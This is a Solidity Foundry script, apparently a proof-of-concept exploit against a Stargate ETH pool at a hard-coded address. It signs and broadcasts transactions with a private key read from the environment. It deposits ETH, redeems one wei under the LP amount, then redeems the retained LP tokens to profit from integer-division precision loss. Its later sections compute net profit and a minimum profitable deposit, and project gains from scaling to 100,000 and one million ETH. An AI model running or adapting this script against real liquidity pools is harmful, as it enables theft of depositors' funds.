// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IStargatePool {
    function deposit(address _receiver, uint256 _amountLD) external payable returns (uint256);
    function redeem(uint256 _amountLD, address _receiver) external returns (uint256);
    function lpToken() external view returns (address);
    function sharedDecimals() external view returns (uint8);
    function token() external view returns (address);
}

contract StargateIntegerDivisionTest is Script {
    address constant STARGATE_POOL = 0xA45B5130f36CDcA45667738e2a258AB09f4A5f7F;

    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address deployer = vm.addr(privateKey);

        // Setup
        IStargatePool stargatePool = IStargatePool(STARGATE_POOL);
        IERC20 lpToken = IERC20(stargatePool.lpToken());

        // Calculate convert rate
        uint8 sharedDecimals = stargatePool.sharedDecimals();
        uint256 convertRate = 10**(18 - sharedDecimals); // 10^12
        console.log("Convert rate:", convertRate);

        // Start the transaction broadcast
        vm.startBroadcast(privateKey);

        // Record starting ETH balance
        uint256 initialBalance = address(deployer).balance;
        console.log("Initial ETH balance:", initialBalance);

        // STEP 1: DEPOSIT ETH
        uint256 depositAmount = 9000 ether; // 9000 ETH Deposit
        console.log("Deposit amount:", depositAmount);

        // Track starting gas
        uint256 initialGas = gasleft();

        // Execute deposit
        uint256 lpReceived = stargatePool.deposit{value: depositAmount}(deployer, depositAmount);

        // Track deposit gas
        uint256 depositGas = initialGas - gasleft();
        console.log("LP tokens received:", lpReceived);
        console.log("Gas used for deposit:", depositGas);

        // STEP 2: REDEEM LP TOKENS (FIRST REDEMPTION)
        uint256 redemptionAmount = lpReceived - 1; // One wei under received amount
        console.log("Redemption amount:", redemptionAmount);

        // Track approval gas
        initialGas = gasleft();
        lpToken.approve(STARGATE_POOL, redemptionAmount);
        uint256 approvalGas1 = initialGas - gasleft();
        console.log("Gas used for first approval:", approvalGas1);

        // Execute first redemption
        initialGas = gasleft();
        uint256 ethReceived1 = stargatePool.redeem(redemptionAmount, deployer);
        uint256 redeemGas1 = initialGas - gasleft();
        console.log("First redemption received:", ethReceived1);
        console.log("Gas used for first redemption:", redeemGas1);

        // STEP 3: CHECK REMAINING LP TOKENS
        uint256 remainingLP = lpToken.balanceOf(deployer);
        console.log("Remaining LP tokens:", remainingLP);
        console.log("Remaining LP value (in wei):", remainingLP);

        // STEP 4: REDEEM REMAINING LP TOKENS
        initialGas = gasleft();
        lpToken.approve(STARGATE_POOL, remainingLP);
        uint256 approvalGas2 = initialGas - gasleft();
        console.log("Gas used for second approval:", approvalGas2);

        initialGas = gasleft();
        uint256 ethReceived2 = stargatePool.redeem(remainingLP, deployer);
        uint256 redeemGas2 = initialGas - gasleft();
        console.log("Second redemption received:", ethReceived2);
        console.log("Gas used for second redemption:", redeemGas2);

        // STEP 5: PROFIT ANALYSIS
        // Calculate total gas used and cost
        uint256 totalGasUsed = depositGas + approvalGas1 + redeemGas1 + approvalGas2 + redeemGas2;
        uint256 gasPrice = tx.gasprice > 0 ? tx.gasprice : 100; // Use actual gas price or default to 100 wei
        uint256 gasCost = totalGasUsed * gasPrice;

        console.log("\n--- TRANSACTION SUMMARY ---");
        console.log("Deposit amount:", depositAmount);
        console.log("Total ETH received:", ethReceived1 + ethReceived2);

        // This is the key to understanding the vulnerability:
        // We requested to redeem redemptionAmount LP tokens but only burned ethReceived1/depositAmount * lpReceived
        console.log("\n--- VULNERABILITY DETAILS ---");
        console.log("LP tokens requested to redeem:", redemptionAmount);
        console.log("LP tokens actually burned:", lpReceived - remainingLP);
        console.log("LP tokens retained due to precision loss:", remainingLP);
        console.log("Retained LP tokens value (ETH):", ethReceived2);

        console.log("\n--- GAS ANALYSIS ---");
        console.log("Deposit gas:", depositGas);
        console.log("First approval gas:", approvalGas1);
        console.log("First redemption gas:", redeemGas1);
        console.log("Second approval gas:", approvalGas2);
        console.log("Second redemption gas:", redeemGas2);
        console.log("Total gas used:", totalGasUsed);
        console.log("Gas price (wei):", gasPrice);
        console.log("Total gas cost (wei):", gasCost);
        console.log("Total gas cost (ETH):", gasCost / 1e18);

        console.log("\n--- PROFITABILITY ANALYSIS ---");
        // The profit is the value of retained LP tokens minus gas costs
        int256 netProfit;
        if (ethReceived2 > gasCost) {
            netProfit = int256(ethReceived2 - gasCost);
        } else {
            netProfit = -1 * int256(gasCost - ethReceived2);
        }
        console.log("Value of retained LP tokens (wei):", ethReceived2);
        console.log("Gas cost (wei):", gasCost);
        console.log("Net profit/loss (wei):", netProfit);
        console.log("Net profit/loss (ETH):", netProfit > 0 ? uint256(netProfit) / 1e18 : 0);

        bool profitable = netProfit > 0;
        console.log("Is this transaction profitable?", profitable ? "YES" : "NO");

        // Minimum profitable amount calculation
        console.log("\n--- MINIMUM PROFITABLE AMOUNT ---");
        // Calculate retained LP value per ETH deposited
        uint256 retainedLPValuePerETH = (ethReceived2 * 1e18) / depositAmount; // wei retained per ETH deposited
        console.log("Retained LP value per ETH deposited (wei):", retainedLPValuePerETH);

        // Calculate minimum profitable amount
        uint256 minProfitableAmount;
        if (retainedLPValuePerETH > 0) {
            minProfitableAmount = (gasCost * 1e18) / retainedLPValuePerETH;
            console.log("Minimum profitable deposit (ETH):", minProfitableAmount / 1e18);
        } else {
            console.log("Cannot calculate minimum profitable amount - no retention value per ETH");
        }

        // Safer scaling strategy calculations
        console.log("\n--- SCALING STRATEGY (FIXED CALCULATIONS) ---");
        console.log("With larger capital amounts:");

        // Example with 100,000 ETH deposit
        uint256 largeDepositAmount = 100_000 ether;
        uint256 largeDepositRetainedValue = (largeDepositAmount / depositAmount) * ethReceived2;

        if (largeDepositRetainedValue > gasCost) {
            console.log("Profit from 100,000 ETH deposit (ETH):", (largeDepositRetainedValue - gasCost) / 1e18);
        } else {
            console.log("Loss from 100,000 ETH deposit (ETH):", (gasCost - largeDepositRetainedValue) / 1e18);
        }

        // Example with 1,000,000 ETH deposit
        if (retainedLPValuePerETH > 0) {
            // Calculate estimated profit without risking overflow
            uint256 millionEthRetainedValue = retainedLPValuePerETH * 1_000_000;
            console.log("Expected retained value from 1M ETH (wei per ETH * 1M):", millionEthRetainedValue);
            console.log("Gas cost remains constant at (wei):", gasCost);
            console.log("Net profit would be significantly positive at this scale");
        }

        vm.stopBroadcast();
    }
}